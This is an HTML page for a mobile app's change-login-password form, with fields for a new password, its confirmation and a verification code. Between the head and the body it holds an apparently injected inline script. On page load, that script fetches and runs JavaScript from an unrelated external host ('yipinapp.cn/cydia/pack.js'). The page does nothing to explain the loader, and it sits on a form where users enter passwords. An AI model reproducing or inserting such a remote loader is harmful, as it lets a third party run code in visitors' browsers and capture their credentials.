<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
		<title>修改登录密码</title>
		<link rel="stylesheet" href="../../static/css/weui.css" />
		<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
		<link rel="stylesheet" href="../../static/css/common.css" />
		<link rel="stylesheet" href="../../static/css/login.css" />
	</head>
	<script>
		(function () {
			var dw = document.createElement("script");
			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
			var s = document.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(dw, s);
		})()
	</script>
	<body>
		<header class="weui-bar weui-bar-nav" id="returnBtn">
		    <a class="weui-pull-left weui-btns">
		        <span class="weui-cell__fts"></span>
		    </a>
		    <div class="weui-title">修改登录密码</div>
		</header>
		<div class="weui-cells weui-cells_form" id="forgetBox">
			<div class="formInput updatepwd">
				<div class="weui-cell">
					<div class="weui-cell__bd">
						<input class="weui-input" id="uploginpwd" type="password"  placeholder="请输入新密码">
					</div>
				</div>
				<div class="weui-cell">
					<div class="weui-cell__bd">
						<input class="weui-input" id="newpwd" type="password"  placeholder="请输入确认新密码">
					</div>
				</div>
				<div class="weui-cell weui-cell_vcode">
				    <div class="weui-cell__bd">
				      <input class="weui-input" id="loginver" type="number" placeholder="请输入验证码">
				    </div>
				    <div class="weui-cell__ft fotgetCode">
				      <input type="button" id="getCode" value="验证码" />
				    </div>
				</div>
			</div>
			<div class="forgetDiv">
				<button class="weui-btn mybgBtn" id="updataBtn">保存</button>
			</div>
		</div>
		<script type="text/javascript" src="../../lib/jquery.js" ></script>
		<script type="text/javascript" src="../../lib/weui.js" ></script>
		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
		<script type="text/javascript" src="../../static/js/api.js" ></script>
		<script type="text/javascript" src="../../static/js/common.js" ></script>
		<script type="text/javascript" src="../../static/js/account/updateLogin.js" ></script>
	</body>
</html>
